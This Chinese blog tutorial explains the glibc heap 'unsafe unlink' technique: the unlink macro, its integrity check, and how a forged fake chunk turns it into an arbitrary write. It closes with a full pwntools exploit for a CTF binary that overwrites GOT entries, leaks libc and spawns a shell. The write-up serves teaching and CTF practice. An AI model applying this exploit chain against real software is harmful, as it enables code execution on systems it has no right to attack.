---
layout: post
title: unlink及unsafe unlink详谈分析
category: system/Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# unsafe unlink

一句话，`unsafe unlink`漏洞是：控制相邻两个`chunk`的`prev size`和`prev_inuse`和`fd bk`等字段的值，以及攻击者明确存放这些`chunk`的地址的指针时，使得程序对不正确的位置进行`unlink`，从而达到任意地址写的目的。

**注意，一般来说`small bin`和`fastbin `正常情况下不会使用`unlink`。**

**但实际上，只是因为若是fastbin或者smallbin或者tcachebin，不会设置下一个chunk的prev_size和prev_inuse位罢了。**

**若我们设置了这两个位，同样可以对fastbin、smallbin、tcache进行unlink，从而构造重叠指针等。**

接下来，我们一步步地看，第一步需要明确什么是正常的`unlink` 。

试想，假如有两个物理相邻的`chunk`，第一个是`free`的，而第二个是`used`。此时，若第二个`chunk`被`free`时，由于前一个`chunk`和他是物理相邻且被`free`的，因此第一个和第二个`chunk`将被合并，且是第一个`chunk`后向合并第二个，并且修改第一个`chunk`的`size`，即合并之后的`size`。

合并时，由于第一个`chunk`本身是处在双向链表`bins`里面的，因此需要把第一个`chunk`从`bins`里面删除，待合并后再放到`unsorted bin`里面去。而第一个`chunk`从`bin`里面删除的操作就叫做`unlink`。

由于之前第一个`chunk`所在的地方是一个双向链表，因此把第一个`chunk`从`bin`里面删除的过程是这样：先断开`chunk`和前后两个`chunk`的指针，然后把它之前的`chunk`指向它后面的，它后面的`chunk`指向它之前的。画个草图示意一下：

![image-20230108202216108](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211710638.png)

这就是正常的`unlink`流程。然而，`unsafe unlink`是利用其中的漏洞。

我们看`unlink`部分的源码：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) { 
    // 注意这里是glibc2.23，若为更高版本，开头会进行检查即P的chunksize是否等于P的下一个chunk的prevsize。                                           
    FD = P->fd;	// 将要unlink的前向为FD							      
    BK = P->bk;	 // 将要unlink的后向为BK						      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
        // 这个if语句是一个检查。假如FD的后向不是P，BK的前向不是P，就无法通过检查。
        // 因此，若想使用unsafe unlink漏洞，需要保证FD的后向是P，BK的前向是P。
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        // 通过上面的安全检查了，那接下来就进行unlink。 若是使用bk或者fd指针的chunk，那么下面两行后就结束了。
        FD->bk = BK; // 将FD的后向连接到BK 							      
        BK->fd = FD; // 将BK的前向连接到FD						
		// 后文是largebin范围内的额外操作      
        if (!in_smallbin_range (P->size)				      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {  
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      
            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) 
                malloc_printerr (check_action,				      
                    "corrupted double-linked list (not small)",    
                    P, AV);				      
                    if (FD->fd_nextsize == NULL) {		
                          if (P->fd_nextsize == P)
                            FD->fd_nextsize = FD->bk_nextsize = FD;	
                          else {							      
                              FD->fd_nextsize = P->fd_nextsize;			      
                              FD->bk_nextsize = P->bk_nextsize;			      
                              P->fd_nextsize->bk_nextsize = FD;			      
                              P->bk_nextsize->fd_nextsize = FD;			      
                            }							      
                      } else {						      
                        P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      
                        P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      
                      }								      
          }								      
      }									      
}
```

可以知道，设`FD = P->fd，BK = P-> bk`只要满足安全检查：

```
FD的bk等于P，且BK的fd等于P
```

就会实现：

```
FD->bk = BK
BK->fd = FD
```

再看一下触发`unlink`操作的源码，此处以`free`为例子：

```c
if (!prev_inuse(p)) { // 若P物理地址的上一个chunk没有被使用，那么free P时，P和上一个chunk将进行合并，并将上一个chunk unlink
    prevsize = p->prev_size; // P的上一个chunk的大小
    size += prevsize;  // P的size加上上一个chunk的size，就得到了合并后的size
    p = chunk_at_offset(p, -((long) prevsize));  // 通过prevsize，向上偏移得到上一个chunk
    unlink(av, p, bck, fwd); // 此时P已经是上一个chunk的指针，将其unlink
}
```

`unsafe unlink`就是通过溢出，在P的上一个chunk中的用户可用部分伪造一个小chunk，从而达到任意地址写的目的。首先看图：

![image-20230110180557450](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211710503.png)

上图是P和P的上一个Chunk，称为Prev Chunk。只要Chunk P中的P为0，那么Prev Chunk就会被识别为freed chunk。此时若再对Chunk P进行free操作，那么Prev Chunk就会被unlink。

试想，若我们修改Chunk P的Prev_Size的值，那么便可以对被`unlink`的地方任意控制！以64位为例，我们若将Prev_Size的值缩小0x8，那么Chunk P的上一个Chunk将是上图中Prev Chunk的Size部分，而不是正确的Prev_Size部分。由此，我们可以通过伪造P的Prev Size，使得对指定位置进行`unlink`。

若将Chunk P的Prev_Size缩小0x10，那么将会对Prev Chunk的fd指针处开始unlink，而这个地方恰好一般是可控的，因此相当于我们在此处完全可以伪造一个新的Chunk，如图所示：

![image-20230110180522157](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211710604.png)

下划线部分是人为控制的，需要尽量控制这些值才可以进行`unsafe unlink`。

伪造的Fake Chunk是虚线框部分。

此时，若对Chunk P进行free，那么Fake Chunk将会被unlink。

我们回顾`unlink`部分：

```c
#define unlink(AV, P, BK, FD) {                                          
    FD = P->fd;							      
    BK = P->bk;	 					      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {								      
        FD->bk = BK; 						      
        BK->fd = FD; 
    }
... 
```

此时传入unlink宏的P，即是Fake Chunk。

那么很明显，满足安全机制`P->fd->bk == P`以及`P->bk->fd == P`才可以进行赋值操作。

我们知道，bk指针实际上只是偏移0x18个字节，fd指针实际上只是偏移0x10字节。

因此：

```c
P->fd->bk == P;
// 等价于
*(P->fd + 0x18) == P;
// 等价于
P->fd + 0x18 == &P;
// 等价于
P->fd = &P - 0x18
```

由此看来，我们只要满足fake chunk中的fd的值为&P - 0x18，即可绕过安全机制。

同样的，bk的值需要为&P - 0x10。注意，这里的P是合并到的地址。

若此时有一个数组/指针，专门用于存放这些`chunk`的地址时，&P便是可知的。

满足安全机制后，便会进行unlink：`FD->bk = Bk , BK->fd = FD`，如下：

```c
P->fd->bk = P->bk;
// 等价于
*(P->fd + 0x18) = &P - 0x10;
// 等价于
*(&P) = &P - 0x10;
P = &P - 0x10;

// 第二行同样：
P->bk->fd = P->fd;
// 等价于：
P = &P - 0x18;
// 即： P指向P自己的地址减去0x18的地方！
```

在可以利用的情况下，用户是可以对自己malloc的chunk进行修改的。因此对prev chunk进行修改，直接会变为修改存放这些chunk的数组/指针的值，我们便可以使其指向任意地址，并完成任意地址写。

## 例题uunlink

exp:

```python
from pwn import *
local = 1
elf = ELF('./uunlink')
context(log_level='debug')
if local:
    p = process('./uunlink')
    libc = elf.libc


def malloc(index, size):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Give me a book ID: ')
    p.sendline(str(index))
    p.recvuntil('how long: ')
    p.sendline(str(size))


def free(index):
    p.recvuntil('Your choice: ')
    p.sendline("3")
    p.recvuntil("Which one to throw?")
    p.sendline(str(index))


def edit(index, size, content):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Which book to write?')
    p.sendline(str(index))
    p.recvuntil("how big?")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def debug():
    pid = util.proc.pidof(p)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()


# 创建四个chunk 
malloc(0, 0x30)
malloc(1, 0xf0)
malloc(2, 0x100)
malloc(3, 0x100)


# 下面伪造fake chunk，并通过溢出修改第二个chunk的prev_inuse，prev_size等
fd = 0x602300 - 0x18
bk = 0x602300 - 0x10
py = b''
py += p64(0) + p64(0x31)
py += p64(fd) + p64(bk)
py += p64(0) + p64(0)
py += p64(0x30) + p64(0x100)
py += p64(0) + p64(0)
py += p64(0) + p64(0)
edit(0, 0x60, py)
# free会触发unlink
free(1)

# 接下来，edit第一个chunk会导致本来指向这些chunk的指针指向别的地方
atoi_got = elf.got['atoi']
free_got = elf.got['free']
py = b''
py += b'a'*0x18 + p64(atoi_got) + p64(atoi_got) + p64(free_got)
edit(0, 0x30, py)


# 这里将free的got表指向puts_plt，调用free时会变成调用puts
edit(2, 0x8, p64(elf.plt['puts']))
# 下面是程序里的free，其实是执行free(chunk[0])，也就是puts(chunk[0])，会打印atoi的got表
free(0)
a = p.recv()
atoi_libc = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = atoi_libc - libc.symbols['atoi']
system_libc = libc_base + libc.symbols['system']
edit(1, 0x8, p64(system_libc))
p.recvuntil('Your choice: ')
p.sendline(b'/bin/sh\x00')
p.interactive()
```

